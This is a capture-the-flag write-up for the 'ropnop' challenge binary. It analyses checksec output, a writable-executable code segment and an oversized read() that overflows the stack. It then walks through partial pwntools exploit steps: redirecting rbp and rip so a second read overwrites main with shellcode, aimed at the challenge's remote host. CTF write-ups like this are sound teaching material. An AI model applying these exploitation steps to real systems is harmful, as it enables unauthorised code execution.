# ROPNOP
## General information
### Analyzing the binary
First we use the file command to get some information about the binary.

```
root@dab66e65c349:/pwd/ropnop# file ropnop
ropnop: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, with debug_info, not stripped
```

To see what security features are enabled we run checksec.

```
root@dab66e65c349:/pwd/ropnop# checksec ropnop
[*] '/pwd/ropnop/ropnop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
Here we directly notice there are no stack-canarys. This allows easy an bufferoverflow, because we don't need to leak values.

### Analyzing the code
Now let's take a look at the provided source code. After the setup we call `ropnop()`. The function prints the start and end of the code segment, later we will use this to defeat ASLR.  Then `mprotect` is called.

`mprotect(start, end-start, PROT_READ|PROT_WRITE|PROT_EXEC);`

This changes the permissions for the code segment to read/write/execute. This is important because if we can write to this segment we can get arbitrary code execution and thereby a shell.
`ropnop()` then uses a while-loop to replace all return instrutions(*op-code: 0xc3*) with a nop(*op-code: 0x90*). However you have to notice that the instruction 

`<+112>:	cmp    ecx, 0xc3`

contains the byte 0xc3 in its opcode and when the while-loop runs over this instruction it gets replaced with

`<+112>:	cmp    ecx,0x90`

Now the function does nothing anymore, because it only replaces nops with nops. This means that only return instruction before the ropnop function are replaced.


Back in main we call read:

```
int* buffer = (int*)&buffer;
read(0, buffer, 0x1337);
```

This enables a buffer overflow, because there is only place for one pointer on the stack, but we can write up to 0x1337 bytes. That way we get control over rbp and rip. You might also notice the function gadget_shop which is never called and contains so useful gadgets for a ROP attack. However gadget_shop is overwritten by ropnop and contains no more return instruction meaning it is now useless. This doesn't really matter because the final exploit needs no specific ROP-gadgets.
## The idea
The buffer overflow allows control over rip, rbp and the stack. If the stack would be executable we could place shell code here and win the challenge, but this is not possible since NX is enabled. We need to overwrite the code segment because it is the only one that has write and execute permissions. To do this we control rip in such a way that we jump back into main and call read again. The following instruction in main set up the read call:
```
<+25>:	xor   edi,edi
<+27>:	lea   rax,[rbp-0x10]
<+31>:	mov   QWORD PTR [rbp-0x10],rax
<+35>:	mov   rax,QWORD PTR [rbp-0x10]
<+39>:	mov   rsi,rax
<+42>:	mov   edx,0x1337
<+47>:	call  0x555555555040 <read@plt>
```
The rax register is the address we will write to and if we can control it we can overwrite code. As you can see at `<+27>` rax is loaded from rbp-0x10 and we already control rbp.

We can use your second buffer overflow that we get because we jump here to overwrite the last instructions of main with shell code. After we return from read back into main our shell code that sits at the end of main will be executed.
## The exploit
To automate the process of sending and receiving data we can use the python library [pwn-tools](http://docs.pwntools.com/en/stable/). We get the process and store it in the variable p.
```
p = remote("hax1.allesctf.net", 9300)
```
We read the output from the printf in ropnop and extract the start address from the string.
```
recv_buf = p.recv(64).split()

start = int(recv_buf[3], 16)
end = int(recv_buf[-1], 16)
```
We can now use this as a base to calculate other addresses from and defeat ASLR. The first buffer overflow consists of a 16 bytes padding to fill up the stack untill rbp, the next 8 bytes will become the new rbp. The new rbp should point to after the read call in main plus 0x10, because rax will point here after we subtract 0x10. Then the second read call will overwrite the code here with our shell code.

The last 8 bytes from the first bufferoverflow will controll rip. We use this to redirct code execution back into main befor the read call.

From the gdb disassemly of main we can see the offsets for the diffrent instructions.
````
   0x00000000000012a0 <+0>:	push   rbp
   0x00000000000012a1 <+1>:	mov    rbp,rsp
   0x00000000000012a4 <+4>:	sub    rsp,0x20
   0x00000000000012a8 <+8>:	mov    DWORD PTR [rbp-0x4],0x0
   0x00000000000012af <+15>:	call   0x1170 <init_buffering>
   0x00000000000012b4 <+20>:	call   0x1200 <ropnop>
   0x00000000000012b9 <+25>:	xor    edi,edi
   0x00000000000012bb <+27>:	lea    rax,[rbp-0x10]
   0x00000000000012bf <+31>:	mov    QWORD PTR [rbp-0x10],rax
   0x00000000000012c3 <+35>:	mov    rax,QWORD PTR [rbp-0x10]
   0x00000000000012c7 <+39>:	mov    rsi,rax
   0x00000000000012ca <+42>:	mov    edx,0x1337
   0x00000000000012cf <+47>:	call   0x1040 <read@plt>
   0x00000000000012d4 <+52>:	xor    ecx,ecx
   0x00000000000012d6 <+54>:	mov    QWORD PTR [rbp-0x18],rax
   0x00000000000012da <+58>:	mov    eax,ecx
   0x00000000000012dc <+60>:	add    rsp,0x20
   0x00000000000012e0 <+64>:	pop    rbp
   0x00000000000012e1 <+65>:	ret
````
So we compute the new rbp value like `rbp = start + 0x12d6 + 0x10` where start is the begining of the code segment. This will cause our 2. read to overwrite main starting at `main<+54>`.

Now we calculate rip so the first read returns to `main<+25>` instead of `main<+52>` to call read again. In code it looks like this `rip = start + 0x12b9`

We use the struct module to turn the integers rip and rbp to bytearrays and send the first input in the expoit script.
````
p.send(padding + rbp + rip)
````

Now we call read again from main, but this time our arguments look like this.

````
 ► 0x5635babeb2cf <main+47>    call   read@plt <0x5635babeb040>
        fd: 0x0
        buf: 0x5635babeb2d6 (main+54) ◂— 0x5635babeb2d6
        nbytes: 0x1337
````

